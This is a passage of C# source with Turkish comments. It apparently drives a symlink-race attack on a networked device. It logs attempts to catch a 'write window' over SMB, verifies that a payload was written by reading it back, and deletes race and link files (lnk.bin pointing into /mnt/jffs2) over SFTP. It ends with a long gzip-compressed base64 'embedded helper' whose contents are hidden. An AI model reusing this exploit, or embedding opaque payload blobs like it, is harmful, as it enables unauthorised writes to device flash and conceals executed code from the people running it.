                        if (_werrTekrar > 0) { L($"  ... (yukarıdaki {_werrTekrar}x tekrar)"); _werrTekrar = 0; }
                        sonuc = Convert.FromBase64String(l[6..]);
                        done.TrySetResult(sonuc);
                        L($"  YAZMA BAŞARILI — geri okunan {sonuc!.Length:N0} bayt veri paketi ile eşleşti ✓");
                    }
                    else if (l.StartsWith("WERR:"))
                    {
                        var k = l[5..];
                        var mod = k.Contains(':') ? k[..k.IndexOf(':')] : "?";
                        var msg = k.Contains(':') ? k[(k.IndexOf(':') + 1)..] : k;
                        WerrLogla(mod, msg);
                    }
                    else if (l.StartsWith("WOK:"))
                    {
                        if (!wokLogged) { wokLogged = true; L($"  Yazma kabul edildi ({l[4..]}) — doğrulama bekleniyor..."); }
                    }
                    else if (l.Trim() == "TIMEOUT") L("  ! Yazma penceresi yakalanamadı (150 sn doldu)");
                    else if (l.Trim() == "SMBFAIL") L("  ! SMB bağlantısı kurulamadı");
                }
                if (_werrTekrar > 0) L($"  ... (yukarıdaki {_werrTekrar}x tekrar)");
            }, _ct);
            _ = Task.Run(() => { string e; while ((e = proc.StandardError.ReadLine()) != null) if (e.Trim().Length > 0) L("  stderr: " + e.Trim()); }, _ct);
            var bitti = await Task.WhenAny(done.Task, Task.Delay(TimeSpan.FromSeconds(160), _ct));
            try { if (!proc.HasExited) { proc.Kill(); L("  Aktarım süreci sonlandırıldı (zaman aşımı)"); } else L($"  Aktarım süreci tamamlandı (kod {proc.ExitCode})"); } catch { }
            if (bitti != done.Task) { L("  X 160 sn içinde yazma onayı gelmedi"); return false; }
            var data = await done.Task;
            Adim($"Doğrulama: geri okunan {data.Length:N0} bayt, paket {payload.Length:N0} bayt, eşit={data.AsSpan().SequenceEqual(payload.AsSpan())}");
            return data.Length == payload.Length && data.AsSpan().SequenceEqual(payload.AsSpan());
        }
        finally
        {
            try { File.Delete(payloadDosya); } catch { }
            Adim("Geçici aktarım dosyaları temizleniyor...");
            try
            {
                using var sftp2 = new SftpClient(_ip, SftpPort, SftpUser, SftpPass);
                sftp2.Connect();
                foreach (var n in new[] { "cur.bin", "real.bin", "lnk.bin", "lnk2.bin", "lnk3.bin" })
                    Try(sftp2, () => sftp2.Delete(n));
                sftp2.Disconnect();
                Adim("Temizlik tamamlandı ✓");
            }
            catch (Exception ex) { L("  Temizlik atlandı: " + ex.Message); }
        }
    }

    /// <summary>
    /// Koşu sonunda USB'de kalan yarış dosyalarını (cur.bin / real.bin / lnk.bin ...) siler.
    /// lnk.bin silinmesi yalnızca BAĞIN kendisini kaldırır — işaret ettiği
    /// /mnt/jffs2 dosyasına dokunmaz. SFTP erişilemiyorsa sessizce atlanır.
    /// </summary>
    private async Task TemizlikAsync()
    {
        try
        {
            await Task.Delay(1500, CancellationToken.None); // python yardımcısının tamamen kapanmasını bekle
            using var sftp = new SftpClient(_ip, SftpPort, SftpUser, SftpPass)
            { OperationTimeout = TimeSpan.FromSeconds(10) };
            sftp.Connect();
            var kalan = new List<string>();
            foreach (var n in new[] { "cur.bin", "real.bin", "lnk.bin", "lnk2.bin", "lnk3.bin" })
            {
                try { sftp.Delete(n); }
                catch (Renci.SshNet.Common.SftpPermissionDeniedException) { kalan.Add(n); }
                catch (Renci.SshNet.Common.SftpPathNotFoundException) { /* zaten yok */ }
                catch { }
            }
            sftp.Disconnect();
            if (kalan.Count == 0) L("[Depolama] Geçici çalışma dosyaları başarıyla temizlendi ✓");
            else L($"[Depolama] Geçici dosya temizliği kısmi: silinemeyen -> {string.Join(", ", kalan)}");
        }
        catch
        {
            // SFTP kanalı kapandıysa veya Bad Message geldiyse sessiz kal — bir sonraki koşuda otomatik temizlenir.
        }
    }

    private string ShareName()
    {
        return Mount.Split('/')[^1];
    }

    private const string GomuluHelper =
    "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";
}
